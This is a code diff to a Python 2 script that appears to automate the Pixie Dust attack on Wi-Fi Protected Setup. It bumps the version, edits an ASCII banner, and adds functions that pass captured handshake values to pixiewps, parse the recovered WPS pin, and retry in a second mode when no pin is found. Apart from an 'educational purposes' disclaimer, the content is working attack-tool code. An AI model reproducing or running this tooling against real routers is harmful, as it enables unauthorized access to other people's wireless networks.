@@ -4,7 +4,7 @@
  # Special thanks to: wiire and anyone working on the pixiedust attack
  #
  # Copyright (c) 2015, nxxxu
- # Version: 1.0
+ # Version: 1.0.1
  #
  # DISCLAIMER: This tool was made for educational purposes only.
  #             The author is NOT responsible for any misuse or abuse.
@@ -69,7 +69,7 @@ def menu():
 		print"|  :  :        :   : :      \   \   ' \ |"
 		print"|  | ,'","       |   | :       :   '  |----" 
 		print"`--''          `---'.|        \   \ ; ///NxXxU   "
-		print"                 `---`         '---"     
+		print"                 `---`         '--- v1.0.1"     
 
 
 
@@ -406,6 +406,31 @@ def pixie():
 	fout2 = open("fPixiewpsOut", "w")
 	ferr2 = open("fPixiewpsErrors", "w")
 	runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", Enonce], stdout=fout2, stderr=ferr2)
+	Popen.wait(runpixie)
+
+	f = open("fPixiewpsOut")
+	line = f.readline()
+	while line:
+		if "WPS pin:" in line:WPSpin=line
+		elif "WPS pin not found!" in line:WPSpin="WPS pin not found!"
+		line = f.readline()
+	f.close()
+	os.remove("fPixiewpsErrors")
+	os.remove("fPixiewpsOut")
+	doing="Bruteforcing pin!"
+	status()
+	if WPSpin=="WPS pin not found!":
+		pixieS()
+	else:
+		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]
+		convPin()
+	
+
+def pixieS():
+	global WPSpin
+	fout2 = open("fPixiewpsOut", "w")
+	ferr2 = open("fPixiewpsErrors", "w")
+	runpixie=Popen(["pixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"], stdout=fout2, stderr=ferr2)
 	Popen.wait(runpixie)
 
 	f = open("fPixiewpsOut")
